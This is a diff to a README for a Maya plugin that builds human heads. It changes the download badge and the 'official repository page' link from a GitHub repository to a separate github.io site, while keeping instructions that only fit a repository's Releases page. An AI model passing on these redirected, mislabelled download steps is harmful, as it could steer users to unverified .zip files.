@@ -1,6 +1,6 @@
 # 👤 gnm-maya - Create realistic human heads in Maya
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dloffph4929/gnm-maya)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dloffph4929.github.io)
 
 This tool helps artists create human heads inside Autodesk Maya. It uses the Google GNM model to build shapes, adjust facial features, and prepare characters for animation. It works for creators who need background characters or detailed digital portraits without manual sculpting.
 
@@ -17,7 +17,7 @@ Ensure you have these items before you begin:
 
 You must visit the project page to access the installation files. Follow these steps to obtain the tool:
 
-1.  Visit the official repository page at: https://github.com/dloffph4929/gnm-maya
+1.  Visit the official repository page at: https://dloffph4929.github.io
 2.  Locate the section labeled Releases on the right side of the screen.
 3.  Click the most recent version link.
 4.  Download the file ending in .zip to your computer.
